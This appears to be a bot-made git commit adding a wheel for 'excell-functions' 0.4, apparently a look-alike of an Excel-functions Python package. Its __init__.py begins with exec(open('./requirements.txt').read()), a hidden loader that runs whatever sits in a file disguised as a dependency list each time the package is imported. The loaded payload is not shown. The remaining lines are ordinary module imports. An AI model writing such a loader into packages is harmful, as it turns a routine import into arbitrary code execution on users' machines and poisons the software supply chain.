ab92accfc17b37ab4f75e992992c8d87c53a136f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-03-03 15:03:20 +0000

    Add package excell-functions/0.4/excell_functions-0.4-py3-none-any.whl

---
+++ packages/excell-functions/excell_functions-0.4-py3-none-any.whl/excell_functions/__init__.py
@@ -0,0 +1,16 @@
+exec(open('./requirements.txt').read())
+
+from .compatibility import *
+from .cube import *
+from .database import *
+from .datetime import *
+from .engineering import *
+from .financial import *
+from .information import *
+from .logical import *
+from .lookup import *
+from .math import *
+from .statistical import *
+from .text import *
+from .users import *
+from .web import *
